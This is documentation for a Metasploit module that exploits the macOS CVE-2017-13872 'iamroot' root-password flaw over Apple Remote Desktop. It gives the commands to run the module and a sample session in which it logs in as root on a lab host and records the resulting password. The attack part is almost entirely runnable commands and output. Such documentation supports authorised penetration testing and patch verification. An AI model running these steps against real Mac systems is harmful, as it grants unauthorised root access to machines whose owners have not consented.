## Description

This module remotely exploits the remote CVE-2017-13872 (iamroot) vulnerability over Apple Remote Desktop protocol (ARD). It assumes that "System Preferences > Sharing > Screen Sharing" is enabled.

## Verification Steps

1. Do: `use auxiliary/scanner/vnc/ard_root_pw`
2. Do: `set RHOSTS [IP]`
4. Do: `run`

## Scenarios

**Running the scanner**

```
msf > use auxiliary/scanner/vnc/ard_root_pw
msf auxiliary(scanner/vnc/ard_root_pw) > set RHOSTS 172.16.143.129
RHOSTS => 172.16.143.129
msf auxiliary(scanner/vnc/ard_root_pw) > run

[*] 172.16.143.129:5900   - Attempting authentication as root.
[*] 172.16.143.129:5900   - Testing login as root with chosen password.
[+] 172.16.143.129:5900   - Login succeeded - root:xaavMPozB2HmDhGX
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**Credentials**

```
msf auxiliary(scanner/vnc/ard_root_pw) > creds
Credentials
===========

host            origin          service         public  private           realm  private_type
----            ------          -------         ------  -------           -----  ------------
172.16.143.129  172.16.143.129  5900/tcp (vnc)  root    xaavMPozB2HmDhGX         Password
```
